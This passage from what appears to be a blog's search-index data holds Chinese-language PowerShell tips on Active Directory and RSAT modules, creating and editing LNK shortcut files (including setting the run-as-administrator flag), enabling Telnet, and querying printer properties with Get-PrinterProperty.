Get-ADAccountAuthorizationGroup Get-ADAccountResultantPasswordRep... Get-ADAuthenticationPolicyGet-ADAuthenticationPolicySilo Get-ADCentralAccessPolicy Get-ADCentralAccessRule Get-ADClaimTransformPolicyGet-ADClaimType Get-ADComputer Get-ADComputerServiceAccount Get-ADDCCloningExcludedApplicati...Get-ADDefaultDomainPasswordPolicy Get-ADDomain Get-ADDomainController Get-ADDomainControllerPasswordRe...Get-ADDomainControllerPasswordRep... Get-ADFineGrainedPasswordPolicy Get-ADFineGrainedPasswordPolicySu... Get-ADForestGet-ADGroup Get-ADGroupMember Get-ADObject Get-ADOptionalFeatureGet-ADOrganizationalUnit Get-ADPrincipalGroupMembership Get-ADReplicationAttributeMetadata Get-ADReplicationConnectionGet-ADReplicationFailure Get-ADReplicationPartnerMetadata Get-ADReplicationQueueOperation Get-ADReplicationSiteGet-ADReplicationSiteLink Get-ADReplicationSiteLinkBridge Get-ADReplicationSubnet Get-ADReplicationUpToDatenessVec...Get-ADResourceProperty Get-ADResourcePropertyList Get-ADResourcePropertyValueType Get-ADRootDSEGet-ADServiceAccount Get-ADTrust Get-ADUser Get-ADUserResultantPasswordPolicyGrant-ADAuthenticationPolicySiloA... Install-ADServiceAccount Move-ADDirectoryServer Move-ADDirectoryServerOperationM...Move-ADObject New-ADAuthenticationPolicy New-ADAuthenticationPolicySilo New-ADCentralAccessPolicyNew-ADCentralAccessRule New-ADClaimTransformPolicy New-ADClaimType New-ADComputerNew-ADDCCloneConfigFile New-ADFineGrainedPasswordPolicy New-ADGroup New-ADObjectNew-ADOrganizationalUnit New-ADReplicationSite New-ADReplicationSiteLink New-ADReplicationSiteLinkBridgeNew-ADReplicationSubnet New-ADResourceProperty New-ADResourcePropertyList New-ADServiceAccountNew-ADUser Remove-ADAuthenticationPolicy Remove-ADAuthenticationPolicySilo Remove-ADCentralAccessPolicyRemove-ADCentralAccessPolicyMember Remove-ADCentralAccessRule Remove-ADClaimTransformPolicy Remove-ADClaimTypeRemove-ADComputer Remove-ADComputerServiceAccount Remove-ADDomainControllerPassword... Remove-ADFineGrainedPasswordPolicyRemove-ADFineGrainedPasswordPolic... Remove-ADGroup Remove-ADGroupMember Remove-ADObjectRemove-ADOrganizationalUnit Remove-ADPrincipalGroupMembership Remove-ADReplicationSite Remove-ADReplicationSiteLinkRemove-ADReplicationSiteLinkBridge Remove-ADReplicationSubnet Remove-ADResourceProperty Remove-ADResourcePropertyListRemove-ADResourcePropertyListMember Remove-ADServiceAccount Remove-ADUser Rename-ADObjectReset-ADServiceAccountPassword Restore-ADObject Revoke-ADAuthenticationPolicySilo... Search-ADAccountSet-ADAccountAuthenticationPolicy... Set-ADAccountControl Set-ADAccountExpiration Set-ADAccountPasswordSet-ADAuthenticationPolicy Set-ADAuthenticationPolicySilo Set-ADCentralAccessPolicy Set-ADCentralAccessRuleSet-ADClaimTransformLink Set-ADClaimTransformPolicy Set-ADClaimType Set-ADComputerSet-ADDefaultDomainPasswordPolicy Set-ADDomain Set-ADDomainMode Set-ADFineGrainedPasswordPolicySet-ADForest Set-ADForestMode Set-ADGroup Set-ADObjectSet-ADOrganizationalUnit Set-ADReplicationConnection Set-ADReplicationSite Set-ADReplicationSiteLinkSet-ADReplicationSiteLinkBridge Set-ADReplicationSubnet Set-ADResourceProperty Set-ADResourcePropertyListSet-ADServiceAccount Set-ADUser Show-ADAuthenticationPolicyExpres... Sync-ADObjectTest-ADServiceAccount Uninstall-ADServiceAccount Unlock-ADAccount","link":"/2021/07/16/enabling-activedirectory-module/"},{"title":"PowerShell 技能连载 - 在 Windows 10 中解锁额外的 PowerShell 模块","text":"Windows 10 附带了许多可用于控制服务器功能的 PowerShell 模块 - 例如 WSUS 更新管理，这只是众多模块中的一个。 在早期的 Windows 10 版本中，这些 PowerShell 模块是所谓的 RSAT 工具（远程服务器管理工​​具）的一部分，需要单独下载。在最近的版本中，您已经拥有 RSAT 工具（本技巧中的所有命令都需要提升权限）： 12\\#requires -RunAsAdminGet-WindowsCapability -Online -Name &quot;Rsat.*&quot; | Format-Table -AutoSize -Wrap -GroupBy Name -Property DisplayName, Description 结果类似于： Name: Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Active Directory Domain Services and Lightweight Directory Services Tools Description ----------- Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS) Tools include snap-ins and command-line tools for remotely managing AD DS and AD LDS on Windows Server. Name: Rsat.BitLocker.Recovery.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: BitLocker Drive Encryption Administration Utilities Description ----------- BitLocker Drive Encryption Administration Utilities include tools for managing BitLocker Drive Encryption features. BitLocker Active Directory Recovery Password Viewer helps to locate BitLocker drive encryption recovery passwords in Active Directory Domain Services (AD DS). Name: Rsat.CertificateServices.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Active Directory Certificate Services Tools Description ----------- Active Directory Certificate Services Tools include the Certification Authority, Certificate Templates, Enterprise PKI, and Online Responder Management snap-ins for remotely managing AD CS on Windows Server Name: Rsat.DHCP.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: DHCP Server Tools Description ----------- DHCP Server Tools include the DHCP MMC snap-in, DHCP server netsh context and Windows PowerShell module for DHCP Server. Name: Rsat.Dns.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: DNS Server Tools Description ----------- DNS Server Tools include the DNS Manager snap-in, dnscmd.exe command-line tool and Windows PowerShell module for DNS Server. Name: Rsat.FailoverCluster.Management.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Failover Clustering Tools Description ----------- Failover Clustering Tools include the Failover Cluster Manager snap-in, the Cluster-Aware Updating interface, and the Failover Cluster module for Windows PowerShell Name: Rsat.FileServices.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: File Services Tools Description ----------- File Services Tools include snap-ins and command-line tools for remotely managing the File Services role on Windows Server. Name: Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Group Policy Management Tools Description ----------- Group Policy Management Tools include Group Policy Management Console, Group Policy Management Editor, and Group Policy Starter GPO Editor. Name: Rsat.IPAM.Client.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: IP Address Management (IPAM) Client Description ----------- IP Address Management (IPAM) Client is used to connect to and manage a remote IPAM server. IPAM provides a central framework for managing IP address space and corresponding infrastructure servers such as DHCP and DNS in an Active Directory forest. Name: Rsat.LLDP.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Data Center Bridging LLDP Tools Description ----------- Data Center Bridging LLDP Tools include PowerShell tools for remotely managing LLDP agents on Windows Server. Name: Rsat.NetworkController.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Network Controller Management Tools Description ----------- Network Controller Management Tools include PowerShell tools for managing the Network Controller role on Windows Server. Name: Rsat.NetworkLoadBalancing.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Network Load Balancing Tools Description ----------- Network Load Balancing Tools include the Network Load Balancing Manager snap-in, the Network Load Balancing module for Windows PowerShell, and the nlb.exe and wlbs.exe command-line tools. Name: Rsat.RemoteAccess.Management.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Remote Access Management Tools Description ----------- Remote Access Management Tools include graphical and PowerShell tools for managing the Remote Access role on Windows Server. Name: Rsat.RemoteDesktop.Services.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Remote Desktop Services Tools Description ----------- Remote Desktop Services Tools include snap-ins for Remote Desktop Licensing Manager, Remote Desktop Licensing Diagnostics and Remote Desktop Gateway Manager. Use Server Manager to administer all other RDS role services. Name: Rsat.ServerManager.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Server Manager Description ----------- Server Manager includes the Server Manager console and PowerShell tools for remotely managing Windows Server, and includes tools to remotely configure NIC teaming on Windows Server and Best Practices Analyzer. Name: Rsat.Shielded.VM.Tools~~~~0.0.1.0 DisplayName ----------- SAT: Shielded VM Tools Description ----------- Shielded VM Tools include the Provisioning Data File Wizard and the Template Disk Wizard. Name: Rsat.StorageMigrationService.Management.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Storage Migration Service Management Tools Description ----------- Provides management tools for storage migration jobs. Name: Rsat.StorageReplica.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Storage Replica Module for Windows PowerShell Description ----------- Includes PowerShell module to remotely manage the Storage Replica feature on Windows Server 2016. Name: Rsat.SystemInsights.Management.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: System Insights Module for Windows PowerShell Description ----------- System Insights module for Windows PowerShell provides the ability to manage System Insights feature. Name: Rsat.VolumeActivation.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Volume Activation Tools Description ----------- Volume activation Tools can be used to manage volume activation license keys on a Key Management Service (KMS) host or in Microsoft Active Directory Domain Services. These tools can be used to install, activate, and manage one or more volume activation license keys, and to configure KMS settings on Windows Server. Name: Rsat.WSUS.Tools~~~~0.0.1.0 DisplayName ----------- RSAT: Windows Server Update Services Tools Description ----------- Windows Server Update Services Tools include graphical and PowerShell tools for managing WSUS. 要访问所有 RSAT PowerShell 模块和工具，您可以像这样启用它们： 123#requires -RunAsAdminGet-WindowsCapability -Online -Name &quot;Rsat.*&quot; | Add-WindowsCapability -Online -Verbose","link":"/2021/07/20/unlock-additional-powershell-modules-in-windows-10/"},{"title":"PowerShell 技能连载 - 管理快捷方式文件（第 1 部分）","text":"PowerShell 可以创建新的 LNK 文件并在旧 COM 对象的帮助下编辑现有文件。 让我们首先在开始菜单中的任何位置找到所有 LNK 文件： 1[Environment]::GetFolderPath('StartMenu') | Get-ChildItem -Filter *.lnk -Recurse 这样可以获取到在开始菜单中任何位置找到的所有 LNK 文件。 接下来，让我们读取它们并找出它们的目标和隐藏的键盘快捷键（如果有）： 12345[Environment]::GetFolderPath('StartMenu') | Get-ChildItem -Filter *.lnk -Recurse | ForEach-Object { $scut = New-Object -ComObject WScript.Shell } { $scut.CreateShortcut($_.FullName) } COM 对象 WScript.Shell 提供了一个名为 CreateShortcut() 的方法，当您传入现有 LNK 文件的路径时，您将返回其内部属性。 在我的环境下，这些 LNK 文件看起来类似于： FullName : C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Visual Studio Code\\Visual Studio Code.lnk Arguments : Description : Hotkey : IconLocation : ,0 RelativePath : TargetPath : C:\\Users\\tobia\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe WindowStyle : 1 WorkingDirectory : C:\\Users\\tobia\\AppData\\Local\\Programs\\Microsoft VS Code FullName : C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Windows PowerShell\\Windows PowerShell (x86).lnk Arguments : Description : Performs object-based (command-line) functions Hotkey : IconLocation : %SystemRoot%\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe,0 RelativePath : TargetPath : C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe WindowStyle : 1 WorkingDirectory : %HOMEDRIVE%%HOMEPATH% FullName : C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Windows PowerShell\\Windows PowerShell ISE (x86).lnk Arguments : Description : Windows PowerShell Integrated Scripting Environment. Performs object-based (command-line) functions Hotkey : IconLocation : %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell_ise.exe,0 RelativePath : TargetPath : C:\\WINDOWS\\syswow64\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe WindowStyle : 1 WorkingDirectory : %HOMEDRIVE%%HOMEPATH% FullName : C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Windows PowerShell\\Windows PowerShell ISE.lnk Arguments : Description : Windows PowerShell Integrated Scripting Environment. Performs object-based (command-line) functions Hotkey : IconLocation : %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell_ise.exe,0 RelativePath : TargetPath : C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe WindowStyle : 1 WorkingDirectory : %HOMEDRIVE%%HOMEPATH% FullName : C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Windows PowerShell\\Windows PowerShell.lnk Arguments : Description : Performs object-based (command-line) functions Hotkey : IconLocation : %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe,0 RelativePath : TargetPath : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe WindowStyle : 1 WorkingDirectory : %HOMEDRIVE%%HOMEPATH% FullName : C:\\Users\\tobia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom\\Uninstall Zoom.lnk Arguments : /uninstall Description : Uninstall Zoom Hotkey : IconLocation : C:\\Users\\tobia\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe,0 RelativePath : TargetPath : C:\\Users\\tobia\\AppData\\Roaming\\Zoom\\uninstall\\Installer.exe WindowStyle : 1 WorkingDirectory :","link":"/2021/07/22/managing-shortcut-files-part-1/"},{"title":"PowerShell 技能连载 - 管理快捷方式文件（第 2 部分）","text":"在上一个技巧中，我们创建了新的快捷方式文件，您已经看到 CreateShortcut() 方法如何提供方法来控制快捷方式的几乎所有细节。这是在桌面上创建 PowerShell 快捷方式的代码： 12345$path = [Environment]::GetFolderPath('Desktop') | Join-Path -ChildPath 'myLink.lnk'$scut = (New-Object -ComObject WScript.Shell).CreateShortcut($path)$scut.TargetPath = 'powershell.exe'$scut.IconLocation = 'powershell.exe,0'$scut.Save() 这就是全部：在您的桌面上现在有一个新的 PowerShell 快捷方式。调整上面的代码以创建其他应用程序和路径的快捷方式。","link":"/2021/07/26/managing-shortcut-files-part-2/"},{"title":"PowerShell 技能连载 - 管理快捷方式文件（第 3 部分）","text":"在上一个技巧中，我们创建了新的快捷方式文件，您已经看到 CreateShortcut() 方法如何提供方法来控制快捷方式的几乎所有细节。这是在桌面上创建 PowerShell 快捷方式的代码： 12345$path = [Environment]::GetFolderPath('Desktop') | Join-Path -ChildPath 'myLink.lnk'$scut = (New-Object -ComObject WScript.Shell).CreateShortcut($path)$scut.TargetPath = 'powershell.exe'$scut.IconLocation = 'powershell.exe,0'$scut.Save() 但是，代码不能做的一件事是启用快捷方式文件的管理员权限，因此双击快捷方式图标会自动提升 LNK 文件启动的 PowerShell。 要启用管理员权限，您必须右键单击新创建的快捷方式文件并手动选择“属性”，然后手动检查相应的对话框。 或者，您需要知道 URL 文件的二进制格式，并通过 PowerShell 翻转这些位。下面的代码将你刚刚在桌面上创建的快捷方式文件变成了一个自动提升的文件： 123456789# launch LNK file as Administrator# THIS PATH MUST EXIST (use previous script to create the LNK file or create one manually)$path = [Environment]::GetFolderPath('Desktop') | Join-Path -ChildPath 'myLink.lnk'# read LNK file as bytes...$bytes = [System.IO.File]::ReadAllBytes($path)# flip a bit in byte 21 (0x15)$bytes[0x15] = $bytes[0x15] -bor 0x20# update the bytes[System.IO.File]::WriteAllBytes($path, $bytes) 当您现在双击 LNK 文件时，它会自动提升权限。将位翻转回原位以从任何 LNK 文件中删除管理员权限功能： 1$bytes[0x15] = $bytes[0x15] -band -not 0x20","link":"/2021/07/28/managing-shortcut-files-part-3/"},{"title":"PowerShell 技能连载 - 在 Windows 10 上启用 Telnet","text":"每个 Windows 10 版本都附带一个 telnet 客户端，但它最初是隐藏的。要启用 telnet 客户端，请以完全管理员权限运行以下命令： 123456PS&gt; Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient -AllPath :Online : TrueRestartNeeded : False 安装 telnet 客户端后，您可以使用它与另一台计算机的任何端口进行远程通信。由于新命令 “telnet“ 是一个控制台应用程序，因此请确保在真正的控制台窗口中运行它，例如 powershell.exe 或 pwsh.exe，而不是 ISE 编辑器。","link":"/2021/07/30/enable-telnet-on-windows-10/"},{"title":"PowerShell 技能连载 - 读取打印机属性（第 1 部分）","text":"您可能知道 Get-Printer，它返回系统上所有已安装打印机的名称。但是，您无法通过这种方式获得特定的打印机功能或设置。 Get-PrinterProperty 可以提供帮助。只需提交打印机名称（使用 Get-Printer 找出可用的打印机名称），然后运行以下命令（确保将打印机名称更改为存在的名称）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP'ComputerName PrinterName PropertyName Type Value------------ ----------- ------------ ---- ----- S/W Laser HP Config:AccessoryO... String 500Stapler S/W Laser HP Config:ActualCust... String 431800_914400 S/W Laser HP Config:AutoConfig... String NotInstalled S/W Laser HP Config:Auto_install String INSTALLED S/W Laser HP Config:BookletMak... String NOTINSTALLED S/W Laser HP Config:CombineMed... String Installed S/W Laser HP Config:DeviceIsMo... String Installed S/W Laser HP Config:DuplexUnit String Installed S/W Laser HP Config:DynamicRender String AUTODEVICE S/W Laser HP Config:EMFSpooling String Automatic S/W Laser HP Config:EdgeToEdge... String Enabled S/W Laser HP Config:EmbeddedJo... String NotInstalled S/W Laser HP Config:EnvFeed_in... String NOTINSTALLED S/W Laser HP Config:HPDisplayD... String True S/W Laser HP Config:HPFontInst... String TRUE S/W Laser HP Config:HPInstalla... String HP2HolePunch-Q3689 S/W Laser HP Config:HPInstalla... String 500Stapler-Q2443 S/W Laser HP Config:HPInstalla... String Auto_install S/W Laser HP Config:HPJobSepar... String NotInstalled S/W Laser HP Config:HPMOutputB... String 500Stapler-Q2443 S/W Laser HP Config:HPMOutputB... String None S/W Laser HP Config:HPOutputBi... String 0-0 S/W Laser HP Config:HPPCL6Version String PDL_VERSION_2-1_OR_GREATER S/W Laser HP Config:HPPinToPri... String NotInstalled S/W Laser HP Config:HPPrnPropR... String hpchl230.cab S/W Laser HP Config:HPPunchUni... String NotInstalled S/W Laser HP Config:InsLwH1_in... String NOTINSTALLED S/W Laser HP Config:InsUpH1_in... String NOTINSTALLED S/W Laser HP Config:JobRetention String Installed S/W Laser HP Config:LineWidthC... String Disabled S/W Laser HP Config:ManualFeed... String INSTALLED S/W Laser HP Config:Memory String 128MB S/W Laser HP Config:PCCFoldUnit String NOTINSTALLED S/W Laser HP Config:PCOptional... String None S/W Laser HP Config:PCVFoldUnit String NOTINSTALLED S/W Laser HP Config:PrinterHar... String Installed S/W Laser HP Config:ProductClass String HP S/W Laser HP Config:SHAccessor... String None S/W Laser HP Config:SHByPassTray String None S/W Laser HP Config:SHDocInser... String None S/W Laser HP Config:SHInstalla... String MXFN19 S/W Laser HP Config:SHLargeCap... String None S/W Laser HP Config:SHMOutputB... String None S/W Laser HP Config:SHPaperFol... String None S/W Laser HP Config:SHPuncherUnit String None S/W Laser HP Config:SPSOptiona... String None S/W Laser HP Config:SecurePrin... String Installed S/W Laser HP Config:StaplingUn... String NOTINSTALLED S/W Laser HP Config:Tray10_ins... String NOTINSTALLED S/W Laser HP Config:Tray1_install String INSTALLED S/W Laser HP Config:Tray2_install String INSTALLED S/W Laser HP Config:Tray3_install String INSTALLED S/W Laser HP Config:Tray4_install String NOTINSTALLED S/W Laser HP Config:Tray5_install String NOTINSTALLED S/W Laser HP Config:Tray6_install String NOTINSTALLED S/W Laser HP Config:Tray7_install String NOTINSTALLED S/W Laser HP Config:Tray8_install String NOTINSTALLED S/W Laser HP Config:Tray9_install String NOTINSTALLED S/W Laser HP Config:TrayExt1_i... String NOTINSTALLED S/W Laser HP Config:TrayExt2_i... String NOTINSTALLED S/W Laser HP Config:TrayExt3_i... String NOTINSTALLED S/W Laser HP Config:TrayExt4_i... String NOTINSTALLED S/W Laser HP Config:TrayExt5_i... String NOTINSTALLED S/W Laser HP Config:TrayExt6_i... String NOTINSTALLED 注意：Get-PrinterProperty 是 Windows 操作系统（客户端和服务器）附带的 PrintManagement 模块的一部分。如果您使用非常旧的 Windows 操作系统或其他操作系统，则 cmdlet 可能不可用。 返回的属性列表取决于打印机型号。运行此命令以仅获取可用属性名的列表： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP' | Select-Object -ExpandProperty PropertyName | Sort-Object -UniqueConfig:AccessoryOutputBinsConfig:ActualCustomRangeConfig:Auto_installConfig:AutoConfigurationConfig:BookletMakerUnit_PCConfig:CombineMediaTypesAndInputBinsConfig:DeviceIsMopierConfig:DuplexUnitConfig:DynamicRenderConfig:EdgeToEdgeSupport_PCConfig:EmbeddedJobAccountingConfig:EMFSpoolingConfig:EnvFeed_installConfig:HPDisplayDocUITabConfig:HPFontInstallerConfig:HPInstallableFinisherConfig:HPInstallableHCOConfig:HPInstallableTrayFeatureNameConfig:HPJobSeparatorPageConfig:HPMOutputBinHCOMapConfig:HPMOutputBinHCOPMLMapConfig:HPOutputBinPMLRangeConfig:HPPCL6VersionConfig:HPPinToPrintOnlyConfig:HPPrnPropResourceDataConfig:HPPunchUnitTypeConfig:InsLwH1_installConfig:InsUpH1_installConfig:JobRetentionConfig:LineWidthCorrectionConfig:ManualFeed_installConfig:MemoryConfig:PCCFoldUnitConfig:PCOptionalOutputBinConfig:PCVFoldUnitConfig:PrinterHardDiskConfig:ProductClassConfig:SecurePrintingConfig:SHAccessoryOutputBinsConfig:SHByPassTrayConfig:SHDocInsertionUnitConfig:SHInstallableHCOConfig:SHLargeCapacityTrayConfig:SHMOutputBinHCOMapConfig:SHPaperFoldUnitConfig:SHPuncherUnitConfig:SPSOptionalOutputBinConfig:StaplingUnit_PCConfig:Tray1_installConfig:Tray10_installConfig:Tray2_installConfig:Tray3_installConfig:Tray4_installConfig:Tray5_installConfig:Tray6_installConfig:Tray7_installConfig:Tray8_installConfig:Tray9_installConfig:TrayExt1_installConfig:TrayExt2_installConfig:TrayExt3_installConfig:TrayExt4_installConfig:TrayExt5_installConfig:TrayExt6_install 一旦您知道您所希望了解的属性名，您就可以将结果限制为以下属性： 123456PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP' -PropertyName Config:AccessoryOutputBins, Config:BookletMakerUnit_PCComputerName PrinterName PropertyName Type Value------------ ----------- ------------ ---- ----- S/W Laser HP Config:AccessoryO... String 500Stapler S/W Laser HP Config:BookletMak... String NOTINSTALLED","link":"/2021/08/03/reading-printer-properties-part-1/"},{"title":"PowerShell 技能连载 - 读取打印机属性（第 2 部分）","text":"在上一个技能中，我们查看了 Get-PrinterProperty，它是 PrintManagement 模块的一部分，可在 Windows 操作系统上使用。 在这个技能中，让我们看看如何在自己的脚本中实际使用打印机值，以及与使用简单数组相比，如何将它们存储在哈希表中使访问打印机属性更容易。 重要提示：实际的打印机属性及其名称取决于您的打印机型号和打印机驱动程序。上面示例中使用的属性名称可能因打印机而异。 当您将 Get-PrinterProperty 返回的结果存储在一个变量中时，该变量包含一个简单的数组，您的工作是使用您所追求的属性来标识数组元素。下面是一个例子： 12345678910111213141516171819202122232425262728293031323334353637PS&gt; $info = Get-PrinterProperty -PrinterName 'S/W Laser HP'# return result is an arrayPS&gt; $info -is [Array]True# array elements can only be accessed via numeric indexPS&gt; $info.Count64# the number of returned properties depends on the printer model# the index of given properties may change so accessing a property by# index works but can be unreliable:PS&gt; $info[0]ComputerName PrinterName PropertyName Type Value------------ ----------- ------------ ---- ----- S/W Laser HP Config:AccessoryO... String 500Stapler# the actual property value is stored in the property “Value”PS&gt; $info[0].Value500Stapler# using comparison operators, you can convert string content to Boolean# for example to check whether a printer has a certain feature installedPS&gt; $info[2]ComputerName PrinterName PropertyName Type Value------------ ----------- ------------ ---- ----- S/W Laser HP Config:AutoConfig... String NotInstalledPS&gt; $info[2].ValueNotInstalledPS&gt; $info[2].Value -eq 'NotInstalled'True 更安全的方法是将结果存储在哈希表中并使用原始属性名称作为键。众所周知，Group-Object 可以自动为您创建哈希表。只需告诉 Group-Object 要用于分组的属性的名称，并要求取回哈希表并将字符串用作哈希表键： 1$info = Get-PrinterProperty -PrinterName 'S/W Laser HP' | Group-Object -Property PropertyName -AsHashTable -AsString 这一次，$info 包含一个哈希表，如果您使用带有 IntelliSense 的 PowerShell 编辑器（如 ISE 或 VSCode），一旦您在输入变量名时按下键盘上的点，就会获得丰富的 IntelliSense，显示可用的属性名称。在控制台中，您可以按 TAB 以使用自动完成功能。 由于 IntelliSense 菜单和 TAB 自动完成还包含一些与哈希表相关的属性和方法，因此您可能需要向下滚动一点或分别按 TAB 几次。 要查询打印机属性的值，选择属性名称后，您需要在属性名称周围添加引号，因为通常打印机属性名称包含特殊字符，如冒号： 12345678910111213141516171819# hash table keys need to be quotedPS&gt; $info.Config:AccessoryOutputBinsAt line:1 char:13+ $info.Config:AccessoryOutputBins+ ~~~~~~~~~~~~~~~~~~~~Unexpected token ':AccessoryOutputBins' in expression or statement. + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : UnexpectedToken# once you add quotes, all is finePS&gt; $info.'Config:AccessoryOutputBins'ComputerName PrinterName PropertyName Type Value------------ ----------- ------------ ---- ----- S/W Laser HP Config:AccessoryO... String 500StaplerPS&gt; $info.'Config:AccessoryOutputBins'.Value500Stapler","link":"/2021/08/05/reading-printer-properties-part-2/"},{"title":"PowerShell 技能连载 - 读取打印机属性（第 3 部分）","text":"在之前的技能中，我们研究了如何使用 Get-PrinterProperty 读取本地安装打印机的打印机属性。此 cmdlet 是所有 Windows 操作系统附带的 PrintManagement 模块的一部分。 重要提示：由于属性名称是特定于打印驱动程序的，如果您需要在整个企业中管理相同类型的打印机，此 cmdlet 会非常有用。如果您想为大量不同的打印机类型创建详细的打印机清单，这不是最佳选择，因为您必须为每个正在使用的打印机驱动程序确定确切的属性名称。同样，在下面的示例中，请确保将打印机属性名称替换为您的打印机支持的名称。 简而言之，要读取特定的打印机属性，您需要提供打印机的名称（运行 Get-Printer 以查找打印机名称）。然后该 cmdlet 会列出所有可用的打印机属性，这些属性可能会因打印机驱动程序和型号而异： 123456789101112PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP'ComputerName PrinterName PropertyName Type Value------------ ----------- ------------ ---- ----- S/W Laser HP Config:AccessoryO... String 500Stapler S/W Laser HP Config:ActualCust... String 431800_914400 S/W Laser HP Config:AutoConfig... String NotInstalled S/W Laser HP Config:Auto_install String INSTALLED S/W Laser HP Config:BookletMak... String NOTINSTALLED S/W Laser HP Config:CombineMed... String Installed S/W Laser HP Config:DeviceIsMo... String Installed S/W Laser HP Config:DuplexUnit String Installed 例如，您可以过滤属性名称并获取已安装和已卸载打印机附件的列表： 12345678910111213141516171819202122232425262728293031323334353637383940PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP' | Where-Object Value -like *installed* | Select-Object -Property PropertyName, ValuePropertyName Value------------ -----Config:AutoConfiguration NotInstalledConfig:Auto_install INSTALLEDConfig:BookletMakerUnit_PC NOTINSTALLEDConfig:CombineMediaTypesAndInputBins InstalledConfig:DeviceIsMopier InstalledConfig:DuplexUnit InstalledConfig:EmbeddedJobAccounting NotInstalledConfig:EnvFeed_install NOTINSTALLEDConfig:HPJobSeparatorPage NotInstalledConfig:HPPinToPrintOnly NotInstalledConfig:HPPunchUnitType NotInstalledConfig:InsLwH1_install NOTINSTALLEDConfig:InsUpH1_install NOTINSTALLEDConfig:JobRetention InstalledConfig:ManualFeed_install INSTALLEDConfig:PCCFoldUnit NOTINSTALLEDConfig:PCVFoldUnit NOTINSTALLEDConfig:PrinterHardDisk InstalledConfig:SecurePrinting InstalledConfig:StaplingUnit_PC NOTINSTALLEDConfig:Tray10_install NOTINSTALLEDConfig:Tray1_install INSTALLEDConfig:Tray2_install INSTALLEDConfig:Tray3_install INSTALLEDConfig:Tray4_install NOTINSTALLEDConfig:Tray5_install NOTINSTALLEDConfig:Tray6_install NOTINSTALLEDConfig:Tray7_install NOTINSTALLEDConfig:Tray8_install NOTINSTALLEDConfig:Tray9_install NOTINSTALLEDConfig:TrayExt1_install NOTINSTALLEDConfig:TrayExt2_install NOTINSTALLEDConfig:TrayExt3_install NOTINSTALLEDConfig:TrayExt4_install NOTINSTALLEDConfig:TrayExt5_install NOTINSTALLEDConfig:TrayExt6_install NOTINSTALLED 知道打印机名称和特定属性名称后，您可以查询各个属性并检索值以在脚本中使用它。以下是检查是否安装了双面打印单元的示例（确保将打印机名称和属性名称调整为您的打印机型号）： 1234567PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP' -PropertyName Config:DuplexUnit | Select-Object -ExpandProperty ValueInstalledPS&gt; $hasDuplexUnit = (Get-PrinterProperty -PrinterName 'S/W Laser HP' -PropertyName Config:DuplexUnit).Value -eq 'installed'PS&gt; $hasDuplexUnitTrue 要远程查询打印机，Get-PrinterProperty 具有 -ComputerName 参数。它接受单个字符串，因此您一次只能查询一台打印机，并且没有 -Credential 参数，因此您无法以其他人身份进行身份验证。你可以试试这个来查询你自己的机器，一旦成功，用真正的远程系统替换计算机名称： 1PS&gt; Get-PrinterProperty -PrinterName 'S/W Laser HP' -ComputerName $env:COMPUTERNAME 由于 cmdlet 使用 Windows 远程管理服务进行远程访问，因此目标打印服务器应启用 WinRM 远程处理（这是 Windows 服务器的默认设置），并且您应该是目标端的管理员。 实际情况中，您还希望能够查询多个服务器并以其他人身份进行身份验证。对于远程访问，首先使用 New-CimSession 指定要查询的所有服务器，并根据需要提交凭据。 接下来，将此会话提交给 Get-PrinterProperty。如果您有适当的访问权限，现在可以并行查询会话中的所有服务器，从而节省大量时间。-ThrottleLimit 参数确定最多实际联系多少个会话。如果您指定的服务器数超过最大连接数，PowerShell 将自动将其余服务器排队： 12345$session = New-CimSession -ComputerName server1, server2, server3 -Credential mydomain\\remotinguserGet-PrinterProperty -PrinterName 'S/W Laser HP' -CimSession $session -ThrottleLimit 100Remove-CimSession -CimSession $session 